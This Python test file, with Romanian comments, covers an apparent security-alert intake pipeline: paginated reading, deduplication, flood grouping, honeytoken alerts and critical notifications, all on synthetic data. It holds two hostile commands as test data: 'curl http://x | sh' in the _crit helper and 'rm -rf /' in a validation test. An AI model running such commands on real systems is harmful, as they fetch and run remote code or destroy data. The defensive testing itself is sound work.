"""Faza 26: intrarea fara pierderi si gruparea (intake.adapter, intake.grouping, intake.critical).

Fara Elasticsearch si fara model: alerte sintetice (elasticlab.eval.synthetic), ES fals cu paginare.
"""
from __future__ import annotations

import random
import types
from datetime import datetime, timedelta, timezone

import pytest
from pydantic import ValidationError

from elasticlab.contracts.messages import AlertaNormalizata, Contabilitate, CriticalClass
from elasticlab.core import honeytokens
from elasticlab.eval import synthetic
from elasticlab.intake import adapter, critical
from elasticlab.intake.grouping import (BoundedSeen, FloodTracker, dedup_key_alert, flood_key,
                                        group_alerts, plan_cycle, take_until_cap)

# 10:03, nu 10:00: momentul alertei e original_time (-2 s); fara margine de fereastra de potop
T0 = datetime(2026, 11, 24, 10, 3, tzinfo=timezone.utc)


def _mixed(seed: int, n: int = 300) -> list[dict]:
    """Lot amestecat: procese, IP-uri, mesaje de jurnal, alerte fara nimic, duplicate."""
    rng = random.Random(seed)
    out = []
    for i in range(n):
        t = T0 + timedelta(seconds=i * rng.choice([0, 1, 1, 2]))
        kind = rng.randrange(4)
        a = synthetic.alert(t, rule=rng.choice(synthetic.RULES), idx=i, rng=rng)
        if kind == 0:
            a["process"] = {"entity_id": f"p{rng.randrange(40)}"}
        elif kind == 1:
            a["source"] = {"ip": f"10.10.0.{rng.randrange(1, 30)}"}
        elif kind == 2:
            a["message"] = f"yara match {rng.randrange(25)}"
        out.append(a)
    out.sort(key=lambda a: (a["@timestamp"], a["kibana.alert.uuid"]))
    return out


# ------------------------------------------------------------------------------------------
# Calea veche si cea noua: aceleasi cazuri
# ------------------------------------------------------------------------------------------


@pytest.mark.parametrize("seed", range(20))
@pytest.mark.parametrize("cap", [0, 1, 5, 50])
def test_fara_potop_plan_e_exact_take_until_cap(seed, cap):
    alerts = _mixed(seed)
    seen = BoundedSeen()
    for a in alerts[: seed * 3]:                     # cateva chei deja vazute
        seen.add(dedup_key_alert(a))
    plan = plan_cycle(alerts, seen, cap, normalize=adapter.normalize, flood=None)
    old = take_until_cap(alerts, seen, cap)
    assert plan.alerts == old
    assert group_alerts(plan.alerts) == group_alerts(old)
    assert plan.floods == []
    assert plan.acct.ok(), plan.acct


@pytest.mark.parametrize("seed", range(10))
def test_potop_sub_prag_nu_schimba_nimic(seed):
    alerts = _mixed(seed)
    plan = plan_cycle(alerts, BoundedSeen(), 50, normalize=adapter.normalize,
                      flood=FloodTracker(threshold=10_000))
    assert plan.alerts == take_until_cap(alerts, BoundedSeen(), 50)


@pytest.mark.parametrize("seed", range(5))
def test_aceleasi_cazuri_pe_aceeasi_fereastra(seed):
    """Criteriul fazei: pe aceeasi fereastra, calea veche (pagina de 500 + plafon) si calea noua
    (citire paginata + plan_cycle) judeca aceleasi cazuri, deschise de aceeasi alerta."""
    from elasticlab.eval import intake_compare
    alerts = _mixed(seed, n=1500)
    es = synthetic.FakeAlertsES(alerts)
    out = intake_compare.compare(es, T0 - timedelta(minutes=1), T0 + timedelta(hours=2), cap=50)
    assert out["identical"], out
    assert out["cases_intake"] == len({dedup_key_alert(a) for a in alerts})
    assert out["cycles_legacy"] > 1                  # pe calea veche fereastra cere mai multe cicluri


# ------------------------------------------------------------------------------------------
# Rafala si potop
# ------------------------------------------------------------------------------------------


def test_rafala_10000_cu_90_la_suta_duplicate_iese_sub_1000_de_cazuri():
    alerts = synthetic.burst(10_000, 0.9)
    assert len(alerts) == 10_000
    for flood in (None, FloodTracker()):
        plan = plan_cycle(alerts, BoundedSeen(), 0, normalize=adapter.normalize, flood=flood)
        assert plan.acct.ok(), plan.acct
        assert plan.acct.citite == 10_000 and plan.acct.amanate == 0
        assert plan.acct.cazuri + plan.acct.incidente_potop <= 1000
        assert len(group_alerts(plan.alerts)) + len(plan.floods) <= 1000


def test_rafala_de_la_o_singura_sursa_devine_un_incident_de_potop():
    # +5 s: momentul alertei e original_time (cu 2 s inainte); toate in aceeasi fereastra de 10 min
    alerts = [synthetic.alert(T0 + timedelta(seconds=i + 5), rule="Web server spawns shell",
                              entity=f"p{i}", idx=i) for i in range(200)]
    plan = plan_cycle(alerts, BoundedSeen(), 0, normalize=adapter.normalize,
                      flood=FloodTracker(threshold=20, window_min=10))
    assert plan.acct.cazuri == 20
    assert len(plan.floods) == 1 and plan.acct.incidente_potop == 1
    fc = plan.floods[0]
    assert len(fc.members) == 180 and len(fc.distinct_keys) == 180
    assert fc.source == "web-prod" and fc.rule == "Web server spawns shell"
    assert plan.acct.in_potop == 180 and plan.acct.ok()


def test_clasele_critice_nu_intra_niciodata_in_potop():
    rid = next(iter(honeytokens.RULES))
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="Honeytoken", rule_id=rid,
                              entity=f"ht{i}", source_ip="10.10.0.220", idx=i) for i in range(100)]
    alerts += [synthetic.alert(T0 + timedelta(seconds=i), rule="Defend", native=True,
                               entity=f"n{i}", idx=1000 + i) for i in range(100)]
    plan = plan_cycle(sorted(alerts, key=lambda a: a["@timestamp"]), BoundedSeen(), 0,
                      normalize=adapter.normalize, flood=FloodTracker(threshold=5))
    assert plan.floods == [] and plan.acct.in_potop == 0
    assert plan.acct.cazuri == 200 and plan.acct.critice == 200
    assert {n.critical for n in plan.critical} == {CriticalClass.HONEYTOKEN,
                                                    CriticalClass.NATIVE_DETECTION}


def test_potopul_continua_in_ciclul_urmator_fara_incident_nou():
    tr = FloodTracker(threshold=3, window_min=10)
    seen = BoundedSeen()
    mk = lambda i: synthetic.alert(T0 + timedelta(seconds=i + 5), rule="R", entity=f"p{i}", idx=i)  # noqa: E731
    p1 = plan_cycle([mk(i) for i in range(10)], seen, 0, normalize=adapter.normalize, flood=tr)
    assert p1.acct.cazuri == 3 and len(p1.floods) == 1
    seen.add(p1.floods[0].key)                       # orchestratorul il marcheaza dupa scriere
    p2 = plan_cycle([mk(i) for i in range(10, 20)], seen, 0, normalize=adapter.normalize, flood=tr)
    assert p2.acct.cazuri == 0 and p2.floods == [] and p2.acct.in_potop == 10 and p2.acct.ok()
    # alta fereastra de 10 minute: din nou cazuri obisnuite pana la prag
    p3 = plan_cycle([synthetic.alert(T0 + timedelta(minutes=12, seconds=i), rule="R",
                                     entity=f"q{i}", idx=100 + i) for i in range(5)],
                    seen, 0, normalize=adapter.normalize, flood=tr)
    assert p3.acct.cazuri == 3 and len(p3.floods) == 1


def test_plafonul_nu_numara_alertele_din_potop_si_nu_le_amana():
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="R", entity=f"p{i}", idx=i)
              for i in range(50)]
    plan = plan_cycle(alerts, BoundedSeen(), 2, normalize=adapter.normalize,
                      flood=FloodTracker(threshold=2))
    assert plan.acct.cazuri == 2 and plan.acct.in_potop == 48 and plan.acct.amanate == 0


def test_plafonul_amana_si_contabilitatea_se_inchide():
    alerts = _mixed(3, n=500)
    plan = plan_cycle(alerts, BoundedSeen(), 5, normalize=adapter.normalize, flood=None)
    a = plan.acct
    assert a.cazuri == 5 and a.amanate > 0 and a.ok()
    assert plan.last_ts == max(x["@timestamp"] for x in plan.alerts)


def test_critice_din_partea_amanata_se_notifica_totusi():
    rid = next(iter(honeytokens.RULES))
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="R", entity=f"p{i}", idx=i)
              for i in range(10)]
    alerts.append(synthetic.alert(T0 + timedelta(seconds=30), rule="HT", rule_id=rid,
                                  source_ip="10.10.0.220", idx=99))
    plan = plan_cycle(alerts, BoundedSeen(), 2, normalize=adapter.normalize, flood=None)
    assert plan.acct.amanate == 9
    assert [n.critical for n in plan.critical] == [CriticalClass.HONEYTOKEN]


# ------------------------------------------------------------------------------------------
# Citirea paginata si cursorul
# ------------------------------------------------------------------------------------------


def test_citirea_paginata_nu_pierde_nimic_nici_la_acelasi_timestamp():
    alerts = []
    for i in range(1234):
        a = synthetic.alert(T0 + timedelta(seconds=i // 50), rule="R", entity=f"p{i}", idx=i)
        alerts.append(a)
    es = synthetic.FakeAlertsES(alerts)
    got, pages, trunc = adapter.read_window(es, T0, T0 + timedelta(hours=1), page_size=100)
    assert not trunc and pages == 13
    assert sorted(a["_soc_ref"]["id"] for a in got) == sorted(a["_soc_ref"]["id"] for a in alerts)
    got, pages, trunc = adapter.read_window(es, T0, T0 + timedelta(hours=1), page_size=100,
                                            max_alerts=1000)
    assert trunc and len(got) == 1000


def test_next_cursor():
    since, until = T0, T0 + timedelta(minutes=5)
    assert adapter.next_cursor(since, until, "2026-11-24T10:05:00Z", 0, False) == until
    assert adapter.next_cursor(since, until, "2026-11-24T10:05:00Z", 3, False) == \
        datetime(2026, 11, 24, 10, 5, tzinfo=timezone.utc)
    assert adapter.next_cursor(since, until, "2026-11-24T10:05:00Z", 0, True) == \
        datetime(2026, 11, 24, 10, 5, tzinfo=timezone.utc)
    # fara un timp citibil: cursorul ramane pe loc, nu sare la capatul ferestrei
    assert adapter.next_cursor(since, until, None, 3, False) == since
    assert adapter.next_cursor(since, until, "nu e o data", 0, True) == since


# ------------------------------------------------------------------------------------------
# Normalizarea si clasele critice
# ------------------------------------------------------------------------------------------


def test_normalizarea():
    rid = next(iter(honeytokens.RULES))
    ht = adapter.normalize(synthetic.alert(T0, rule="HT", rule_id=rid, source_ip="10.10.0.220"))
    assert ht.critical is CriticalClass.HONEYTOKEN and ht.source == "10.10.0.220"
    own = adapter.normalize(synthetic.alert(T0, rule="HT", rule_id=rid, source_ip="127.0.0.1"))
    assert own.critical is None                 # momeala de pe IP propriu: la om, fara paginare
    nat = adapter.normalize(synthetic.alert(T0, rule="D", native=True))
    assert nat.critical is CriticalClass.NATIVE_DETECTION
    from elasticlab.tier1 import sensor_rules
    sen = adapter.normalize(synthetic.alert(T0, rule="S", rule_id=next(iter(sensor_rules.RULES))))
    assert sen.critical is CriticalClass.SENSOR_DETECTION
    plain = adapter.normalize(synthetic.alert(T0, rule="R", entity="p1"))
    assert plain.critical is None and plain.event_at < plain.indexed_at
    assert plain.dedup_key == dedup_key_alert(plain.raw)


def test_plicul_refuza_campuri_in_plus_si_alerte_fara_referinta():
    n = adapter.normalize(synthetic.alert(T0, rule="R"))
    with pytest.raises(ValidationError):
        AlertaNormalizata(**{**n.model_dump(), "comanda": "rm -rf /"})
    a = synthetic.alert(T0, rule="R")
    a.pop("_soc_ref")
    assert adapter.normalize(a) is None
    plan = plan_cycle([a], BoundedSeen(), 0, normalize=adapter.normalize)
    assert plan.acct.respinse == 1 and plan.alerts == [a] and plan.acct.ok()


def test_contabilitate_detecteaza_dezechilibrul():
    assert Contabilitate(citite=3, consumate=3, cazuri=1, grupate=2).ok()
    assert not Contabilitate(citite=3, consumate=2, cazuri=1, grupate=1).ok()


# ------------------------------------------------------------------------------------------
# Notificarea la intrare
# ------------------------------------------------------------------------------------------


class Sender:
    def __init__(self, ok=True, boom=False):
        self.calls, self.ok, self.boom = [], ok, boom

    def __call__(self, title, detail, **kw):
        self.calls.append((title, detail, kw))
        if self.boom:
            raise RuntimeError("retea")
        return self.ok


def _crit(i, cmd="curl http://x | sh"):
    rid = next(iter(honeytokens.RULES))
    a = synthetic.alert(T0, rule="HT", rule_id=rid, source_ip=f"10.10.0.{i + 1}", idx=i)
    a["process"] = {"command_line": cmd, "entity_id": f"e{i}"}
    return adapter.normalize(a)


def test_notificarea_e_un_pointer_fara_telemetrie_bruta():
    s = Sender()
    done = critical.notify_critical([_crit(0)], send=s, recent=lambda k, m: False, shadow=True)
    assert len(done) == 1 and len(s.calls) == 1
    title, detail, kw = s.calls[0]
    assert title.startswith("[SHADOW]") and "curl" not in title + detail
    assert kw["severity"] == "critical" and kw["dedup_key"].startswith("intrare:")


def test_notificarea_deja_trimisa_conteaza_fara_retrimitere():
    s = Sender()
    done = critical.notify_critical([_crit(0)], send=s, recent=lambda k, m: True, shadow=False)
    assert len(done) == 1 and s.calls == []


def test_esecul_notificarii_lasa_plasa_de_dupa_verdict():
    for s in (Sender(ok=False), Sender(boom=True)):
        assert critical.notify_critical([_crit(0)], send=s, recent=lambda k, m: False,
                                        shadow=False) == set()


def test_peste_limita_un_singur_sumar():
    s = Sender()
    crit = [_crit(i) for i in range(25)]
    done = critical.notify_critical(crit, send=s, recent=lambda k, m: False, shadow=False,
                                    max_individual=10)
    assert len(s.calls) == 11 and len(done) == 25
    assert "Inca 15" in s.calls[-1][0]


# ------------------------------------------------------------------------------------------
# Orchestratorul pe calea noua
# ------------------------------------------------------------------------------------------


def test_orchestratorul_pe_intake_judeca_notifica_si_muta_cursorul(monkeypatch):
    import orchestrator
    rid = next(iter(honeytokens.RULES))
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="R", entity=f"p{i % 7}", idx=i)
              for i in range(40)]
    alerts.append(synthetic.alert(T0 + timedelta(seconds=50), rule="HT", rule_id=rid,
                                  source_ip="10.10.0.220", entity="ht", idx=99))
    monkeypatch.setattr(orchestrator, "ES", synthetic.FakeAlertsES(alerts))
    cursor = []
    monkeypatch.setattr(orchestrator, "save_cursor", cursor.append)
    monkeypatch.setattr(orchestrator, "_save_seen", lambda s: None)
    sent = Sender()
    monkeypatch.setattr(orchestrator.notify, "notify_human", sent)
    monkeypatch.setattr(orchestrator.notify, "recent", lambda k, m: False)
    monkeypatch.setattr(orchestrator.degraded, "llm_healthy", lambda role: True)
    calls = {}

    def fake_process(al, seen, stats, model_ok=True, t2_limit=0, notified=None):
        calls["alerts"], calls["notified"] = al, notified
        for k, _ in group_alerts(al):
            seen.add(k)
    monkeypatch.setattr(orchestrator, "process_alerts", fake_process)
    args = types.SimpleNamespace(limit=50, intake_max=20_000, intake_page=7, t2_limit=0)
    stats = {"total": 0, "escalated": 0, "no_model": 0}
    until = T0 + timedelta(minutes=5)
    got = orchestrator._run_intake(T0, until, BoundedSeen(), stats, FloodTracker(), args, 1, "s")
    assert len(got) == 41 and cursor == [until]
    assert len(sent.calls) == 1 and calls["notified"] == {dedup_key_alert(alerts[-1])}
    acct = Contabilitate(**stats["intake"])
    assert acct.citite == 41 and acct.cazuri == 8 and acct.grupate == 33 and acct.ok()
    assert acct.critice_notificate == 1 and acct.pagini == 6


def test_persist_nu_pagineaza_a_doua_oara_dupa_notificarea_la_intrare(monkeypatch):
    import orchestrator
    from elasticlab.core.escalation import EscalationDecision
    from elasticlab.contracts.schemas import EscalationReason, Verdict
    w = types.SimpleNamespace(index=lambda **k: None)
    monkeypatch.setattr(orchestrator, "WRITER", w)
    monkeypatch.setattr(orchestrator, "_upsert_case", lambda *a, **k: None)
    monkeypatch.setattr(orchestrator, "PROMPT_SET", "test")
    paged = []
    monkeypatch.setattr(orchestrator.notify, "maybe_notify_escalation",
                        lambda *a, **k: paged.append(1) or True)
    v = Verdict(investigation_id="i", source_path="fast", entity_type="host", entity_id="web-prod",
                classification="malicious", confidence=90, rarity_score=1.0, model_id="m")
    d = orchestrator.decide(v)
    esc = EscalationDecision(escalate=True, reasons=[EscalationReason.HONEYTOKEN])
    now = datetime.now(timezone.utc)
    orchestrator.persist(v, "", d, now, now, {"notified_at_intake": True}, escalation=esc)
    assert paged == []
    orchestrator.persist(v, "", d, now, now, {}, escalation=esc)
    assert paged == [1]


def test_potopul_scrie_un_singur_verdict_escaladat_din_cod(monkeypatch):
    import orchestrator
    from elasticlab.contracts.schemas import EscalationReason
    rec = []
    monkeypatch.setattr(orchestrator, "_record", lambda *a, **k: rec.append((a, k)))
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="R", entity=f"p{i}", idx=i)
              for i in range(100)]
    plan = plan_cycle(alerts, BoundedSeen(), 0, normalize=adapter.normalize,
                      flood=FloodTracker(threshold=10))
    seen = BoundedSeen()
    stats = {}
    orchestrator.process_floods(plan.floods, seen, stats)
    assert len(rec) == 1 and stats["flood_cases"] == 1
    (kind, entity, v, narrative, _t0, extra), kw = rec[0]
    assert kind == "POTOP" and v.classification.value == "undetermined"
    assert v.proposed_action.value == "escalate_human" and v.model_id == "none"
    assert kw["escalation"].reasons == [EscalationReason.FLOOD]
    assert extra["case_alert_count"] == 90 and len(kw["refs"]) == orchestrator.CASE_MAX_REFS
    assert plan.floods[0].key in seen and plan.floods[0].key == flood_key(
        "R", "web-prod", plan.floods[0].window)


def test_potopul_nescris_nu_e_marcat_vazut(monkeypatch):
    import orchestrator

    def boom(*a, **k):
        raise RuntimeError("ES cazut")
    monkeypatch.setattr(orchestrator, "_record", boom)
    alerts = [synthetic.alert(T0 + timedelta(seconds=i), rule="R", entity=f"p{i}", idx=i)
              for i in range(30)]
    plan = plan_cycle(alerts, BoundedSeen(), 0, normalize=adapter.normalize,
                      flood=FloodTracker(threshold=10))
    seen = BoundedSeen()
    orchestrator.process_floods(plan.floods, seen)
    assert plan.floods[0].key not in seen


@pytest.mark.parametrize("value,ok", [("legacy", True), ("intake", True), ("", True),
                                      ("queue", False), ("altceva", False)])
def test_comutatorul_soc_pipeline(monkeypatch, value, ok):
    import sys
    import orchestrator
    monkeypatch.setenv("SOC_PIPELINE", value)
    monkeypatch.setattr(orchestrator.notify, "notify_human", lambda *a, **k: False)
    monkeypatch.setattr(orchestrator.prompts, "verify", lambda: (True, [], "x"))
    monkeypatch.setattr(orchestrator, "run_positioned", lambda args: 0)
    monkeypatch.setattr(sys, "argv", ["orchestrator.py", "--once"])
    assert (orchestrator.main() == 0) is ok
    if not ok:
        assert orchestrator.main() == 4


def test_implicit_ramane_legacy(monkeypatch):
    import orchestrator
    monkeypatch.delenv("SOC_PIPELINE", raising=False)
    assert orchestrator.pipeline() == "legacy"
